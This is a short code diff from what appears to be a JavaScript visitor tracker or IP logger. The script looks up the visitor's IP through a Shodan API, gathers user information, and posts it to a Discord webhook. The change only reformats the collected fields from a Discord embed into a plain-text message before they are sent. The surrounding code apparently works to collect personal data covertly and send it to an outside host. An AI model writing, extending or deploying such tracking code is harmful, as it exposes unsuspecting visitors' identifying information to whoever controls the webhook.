@@ -101,26 +101,13 @@ fetch(SHODAN_IP_API_URL)
 
     const userInfo = getUserInfo();
 
-    const fields = Object.keys(userInfo).map((key) => {
-      return {
-        name: key,
-        value: userInfo[key] || "N/A",
-        inline: true,
-      };
-    });
+    let userInfoText = `User Information for IP: ${IP}\n\n`;
+    for (let key in userInfo) {
+      userInfoText += `${key}: ${userInfo[key] || "N/A"}\n`;
+    }
 
     const payload = {
-      content: `User Information for IP: ${IP}`,
-      embeds: [
-        {
-          title: "User Information",
-          fields: fields,
-          color: 3447003,
-          footer: {
-            text: "User Information Tracker",
-          },
-        },
-      ],
+      content: userInfoText,
     };
 
     // Send the IP to the Discord webhook
